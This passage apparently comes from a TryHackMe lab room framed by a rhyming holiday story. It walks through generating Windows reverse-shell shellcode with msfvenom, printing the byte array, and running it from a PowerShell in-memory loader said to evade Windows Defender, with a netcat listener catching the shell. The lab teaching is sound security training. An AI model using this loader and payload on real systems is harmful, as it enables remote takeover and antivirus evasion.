      <th>glitch</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>Passw0rd</td>
    </tr>
    <tr>
      <td><strong>IP</strong></td>
      <td>MACHINE_IP</td>
    </tr>
  </tbody>
</table>

<p>Aside from the VM, you must also start the AttackBox for this task. Click on the <code class="language-plaintext highlighter-rouge">Start AttackBox</code> button located above this page.</p>

<h2 id="essential-terminologies">Essential Terminologies</h2>

<p><em>A reverse shell to his system so tight,</em></p>

<p><em>He planned to showcase at the tech conference night.</em></p>

<p><em>Eager to share how his shellcode could impress,</em></p>

<p><em>He aimed to enlighten, to teach and progress.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p>Before we start, review some important concepts to help you better understand the upcoming content. Shellcode is an advanced topic, but knowing these foundational ideas will make the rest of the material more accessible and engaging.</p>

<ul>
  <li><strong>Shellcode</strong>: A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.</li>
  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375094892.png" alt="anti-virus shield depicting protection" /><strong>PowerShell</strong>: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.</li>
  <li><strong>Windows Defender</strong>: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognise known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defences. We will cover the latter one in this task. \n</li>
  <li><strong>Windows API</strong>: The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, <code class="language-plaintext highlighter-rouge">CreateThread</code>, <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>, which we will also use in this task for exploitation.</li>
  <li><strong>Accessing Windows API through PowerShell Reflection</strong>: Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.</li>
  <li><strong>Reverse shell</strong>: A type of connection in which the target (the machine you’re trying to hack) initiates a connection back to your attacking machine (in this case, your machine will be the AttackBox).</li>
  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375153734.png" alt="process flow of reverse shell" /></li>
</ul>

<h2 id="generating-shellcode">Generating Shellcode</h2>

<p><em>But Mayor Malware’s minions, sneaky and sly,</em></p>

<p><em>Found his script and gave it a try.</em></p>

<p><em>They tampered the code, changed port and IP,</em></p>

<p><em>Twisted his work with a sinister glee.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p>Let’s learn how to generate a shellcode to see what it looks like. To do this, we will use a tool called <code class="language-plaintext highlighter-rouge">msfvenom</code>to get a reverse shell. \n</p>

<p>In the AttackBox, open the terminal and enter the command <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell</code> that will generate the shellcode. The output will look like the following.  You will require to replace the <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code> with the IP of the AttackBox.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="nx">ATTACKBOX_IP</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">1111</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">powershell</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">platform</span> <span class="nx">was</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">choosing</span> <span class="nx">Msf</span><span class="p">::</span><span class="nx">Module</span><span class="p">::</span><span class="nx">Platform</span><span class="p">::</span><span class="nx">Windows</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">arch</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">selecting</span> <span class="nx">arch</span><span class="p">:</span> <span class="nx">x64</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
<span class="nx">No</span> <span class="nx">encoder</span> <span class="nx">specified</span><span class="p">,</span> <span class="nx">outputting</span> <span class="nx">raw</span> <span class="nx">payload</span>
<span class="nx">Payload</span> <span class="nx">size</span><span class="p">:</span> <span class="mi">460</span> <span class="nx">bytes</span>
<span class="nx">Final</span> <span class="nx">size</span> <span class="k">of</span> <span class="nx">powershell</span> <span class="nx">file</span><span class="p">:</span> <span class="mi">2259</span> <span class="nx">bytes</span>
<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="mh">0xfc</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe5</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
<span class="mh">0x30</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0xb7</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
<span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0xf2</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span>
<span class="mh">0x10</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd1</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span>
<span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd6</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
<span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x3</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span>
<span class="mh">0xe4</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span>
<span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
<span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0xb2</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span>
<span class="mh">0x0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span>
<span class="mh">0xa6</span><span class="p">,</span><span class="mh">0x95</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x9d</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x6</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0xa</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span>
<span class="mh">0x47</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x0</span>
</code></pre></div></div>

<p>The above command generates a piece of shellcode using <code class="language-plaintext highlighter-rouge">msfvenom</code>. Here’s what each part means:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-p windows/x64/shell_reverse_tcp</code>: The <code class="language-plaintext highlighter-rouge">-p</code> flag tells <code class="language-plaintext highlighter-rouge">msfvenom</code> what type of payload to create. <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code> specifies that we want a reverse shell for a Windows machine.</li>
  <li><code class="language-plaintext highlighter-rouge">LHOST=ATTACKBOX_IP</code>: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.</li>
  <li><code class="language-plaintext highlighter-rouge">LPORT=1111</code>: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (<code class="language-plaintext highlighter-rouge">1111</code> in this example). You can choose any available port, but it needs to match with what your listener is set to.</li>
  <li><code class="language-plaintext highlighter-rouge">-f powershell</code>: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine. \n</li>
</ul>

<p><strong>Where Is the Actual Shellcode</strong></p>

<p>The actual shellcode in the output above is the hex-encoded byte array, which starts with <code class="language-plaintext highlighter-rouge">0xfc, 0xe8, 0x82</code>, and so on. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, you see something like <code class="language-plaintext highlighter-rouge">0xfc</code>instead. \n</p>

<p>We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>

<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>

<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

}
</span><span class="dl">"</span><span class="p">@</span>
<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>

<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
<span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p><em>Phew!</em> That’s a lot of code. But don’t stress. We’ll break down what it does step by step.</p>

<p>If you’re new to cyber security, memorising these functions is unnecessary. Most penetration testers use pre-made or automated tools to run shellcode, so you don’t have to know every technical detail to complete the job. No need to worry! \n</p>

<p><strong>Explanation of the Code</strong></p>

<p>The script starts by defining a few C# classes. These classes use the <code class="language-plaintext highlighter-rouge">DllImport</code> attribute to load specific functions from the <code class="language-plaintext highlighter-rouge">kernel32</code>DLL, which is part of the Windows API. \n</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">VirtualAlloc</code>: This function allocates memory in the process’s address space. It’s commonly used in scenarios like this to prepare memory for storing and executing shellcode.</li>
  <li><code class="language-plaintext highlighter-rouge">CreateThread</code>: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.</li>
  <li><code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.</li>
</ul>

<p>These classes are then added to PowerShell using the <code class="language-plaintext highlighter-rouge">Add-Type</code> command, allowing PowerShell to use these functions.</p>

<p><strong>Storing the Shellcode in a Byte Array</strong></p>

<p>Next, the script stores the shellcode in the <code class="language-plaintext highlighter-rouge">$buf</code> variable, a byte array. In the example above, <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> is just there to show where you would insert the actual shellcode earlier generated through <code class="language-plaintext highlighter-rouge">msfvenom</code>. Usually, you’d replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.</p>

<p><strong>Allocating Memory for the Shellcode</strong></p>

<p>The <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">0</code> for the memory address, meaning that Windows will decide where to allocate the memory.</li>
  <li><code class="language-plaintext highlighter-rouge">$size</code> for the size of the memory block, which is determined by the length of the shellcode.</li>
  <li><code class="language-plaintext highlighter-rouge">0x3000</code> for the allocation type, which tells Windows to reserve and commit the memory.</li>
  <li><code class="language-plaintext highlighter-rouge">0x40</code> for memory protection, the memory is readable and executable (necessary for executing shellcode).</li>
</ul>

<p>After memory is allocated, the <code class="language-plaintext highlighter-rouge">Marshal.Copy</code> function copies the shellcode from the <code class="language-plaintext highlighter-rouge">$buf</code> array into the allocated memory address (<code class="language-plaintext highlighter-rouge">$addr</code>), preparing it for execution.</p>

<p><strong>Executing the Shellcode and Waiting for Completion</strong></p>

<p>Once the shellcode is stored in memory, the script calls the <code class="language-plaintext highlighter-rouge">CreateThread</code> function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (<code class="language-plaintext highlighter-rouge">$addr</code>). The script then uses the <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.</p>

<h2 id="time-for-some-action---executing-the-shellcode">Time for Some Action - Executing the Shellcode</h2>

<p>On the AttackBox, execute the command <code class="language-plaintext highlighter-rouge">nc -nvlp 1111</code> to start a listener on port <code class="language-plaintext highlighter-rouge">1111</code> and wait for an incoming connection. This command opens port <code class="language-plaintext highlighter-rouge">1111</code> and listens for connections, allowing the AttackBox to receive data once a connection is made.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">nvlp</span> <span class="mi">1111</span>
<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1111</span><span class="p">)</span>
</code></pre></div></div>

<p>On the AttackBox, begin by navigating to the Desktop. Right-click on the <code class="language-plaintext highlighter-rouge">Desktop</code>, select <code class="language-plaintext highlighter-rouge">Create Document</code>, and then choose <code class="language-plaintext highlighter-rouge">Empty File</code>. Open this new file and paste the previously provided PowerShell script code into it. Look for the part labelled <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> and replace it with the shell code we previously created with <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732683410058.png" alt="creating new file sand saving shellcode" /> \n</p>

<p>Once you’ve added the shellcode navigate to the attached VM, open PowerShell by clicking the PowerShell icon on the taskbar and paste parts of the code from the document you recently created to the Windows PowerShell window. For example, the first part to copy and paste is the block below:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>

<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>

<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

}
</span><span class="dl">"</span><span class="p">@</span>
<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>
</code></pre></div></div>

<p>Then paste the line below, replacing the placeholder with the shellcode generated by msfvenom, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
</code></pre></div></div>

<p>Continue copying and pasting the lines from the code below. Remember, copy one line at a time, paste it, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p>If you’ve done it properly, the PowerShell terminal in the VM will look like the screenshot below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732698537726.png" alt="PowerShell screenshot after executing the script" /> \n</p>

<p>Once you execute the final line in the PowerShell terminal and press <code class="language-plaintext highlighter-rouge">Enter</code>, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuing <code class="language-plaintext highlighter-rouge">dir</code>, which will list all the directories.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1727972837925.png" alt="successful shell screenshot" /></p>

<h2 id="regaining-access">Regaining Access</h2>

<p><em>Now Glitch must act, no time to delay,</em></p>

<p><em>To fix the shellcode and keep foes at bay.</em></p>

<p><em>He tweaks and he codes to set the wrongs right,</em></p>

<p><em>Protecting his secrets with all of his might.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p>Let’s dive into the story and troubleshoot the issue in this part of the task. Glitch has realised he’s no longer receiving incoming connections from his home base. Mayor Malware’s minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch is <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code>, and the successful connection port should be <code class="language-plaintext highlighter-rouge">4444</code>.</p>

<p>Can you help Glitch identify and update the shellcode with the correct IP and port to restore the connection and reclaim control?</p>

